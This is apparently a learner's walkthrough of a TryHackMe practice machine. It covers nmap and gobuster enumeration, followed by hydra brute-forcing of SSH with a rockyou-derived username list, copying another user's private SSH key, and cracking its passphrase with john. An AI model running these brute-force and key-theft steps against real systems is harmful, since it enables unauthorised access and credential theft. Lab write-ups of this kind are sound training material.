Enumeration
===========

Nmap
----

    nmap -sS -A -T4 -oN nmap.log -vv 10.10.15.44

### Result

    22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    8009/tcp open  ajp13?      syn-ack ttl 61
    8080/tcp open  http-proxy  syn-ack ttl 61
    |_http-title: Apache Tomcat/9.0.7

    | nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | Names:
    |   BASIC2<00>           Flags: <unique><active>
    |   BASIC2<03>           Flags: <unique><active>
    |   BASIC2<20>           Flags: <unique><active>
    |   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
    |   WORKGROUP<00>        Flags: <group><active>
    |   WORKGROUP<1d>        Flags: <unique><active>
    |   WORKGROUP<1e>        Flags: <group><active>
    | smb-os-discovery:
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: basic2
    |   NetBIOS computer name: BASIC2\x00
    |   Domain name: \x00
    |   FQDN: basic2
    |_  System time: 2020-10-05T03:26:38-04:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required

#### Run nmap again against 445 with the script smb-enum-shares

    smb-enum-shares:
    |   account_used: guest
    |   \\10.10.20.248\Anonymous:
    |     Type: STYPE_DISKTREE
    |     Comment:
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\samba\anonymous
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.20.248\IPC$:
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (Samba Server 4.3.11-Ubuntu)
    |     Users: 1
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |_    Current user access: READ/WRITE

Gobuster
--------

### Port 80

    /.hta (Status: 403)
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /development (Status: 301)
    /index.html (Status: 200)
    /server-status (Status: 403)

### Port 8080

    /docs (Status: 302)
    /examples (Status: 302)
    /favicon.ico (Status: 200)
    /host-manager (Status: 302)
    /manager (Status: 302)

Zap
---

### Notes

-   `conf/tomcat-users.xml` - possible contains user:password
-   `user username="tomcat" password="s3cret" roles="manager-gui"` -
    possible login
-   admin-gui and admin-script replaced the admin role
-   Apache struts 2.5.12
-   /etc/shadow weak password hash
-   j\* - start of a possible username and as mentioned above, possibly
    a weak password
-   k\* - start of a possible username

Exploitation
============

Metasploit
----------

I did briefly try to use a metasploit module targetting sambda, but my
lack of knowledge and experience had me give up and reference the
TryHackMe tasks which mentioned brute-forcing, so I was pretty sure this
wasn't the intended attack vector.

Brute forcing
-------------

### SSH

Let's try brute-forcing the username and password for SSH First I
filtered and sorted the rockyou.txt wordlist by length and lines
starting with j and only containing username valid characters:

    grep "^j" rockyou.txt | grep "^[a-Z0-9\-\_]*$" | perl -e 'print sort { length($a) <=> length($b) } <>' > j-names.txt

Is there a better way to do it? Probably. Anyways, now to run hydra:

    hydra -L j-names.txt -P rockyou.txt 10.10.20.248 -t 4 ssh

After ages we finally find the username and password pair. Next is to
ssh into the machine and find an attack vector.

    ssh jay@<ip>
    jay@basic2:~$ ls -ahl /home/kay/ # Find .ssh/id_rsa file, copy contents

Now with the contents of id\_rsa, we use john the ripper to get the
password:

    ssh2john id_rsa > id_rsa.hash
    john --wordlist=rockyou.txt id_rsa.hash

Now that we have the password to the ssh key, we ssh in and get the
password.bak:

    ssh -i id_rsa kay@<ip>
    kay@basic2:~$ cat /home/kay/password.bak
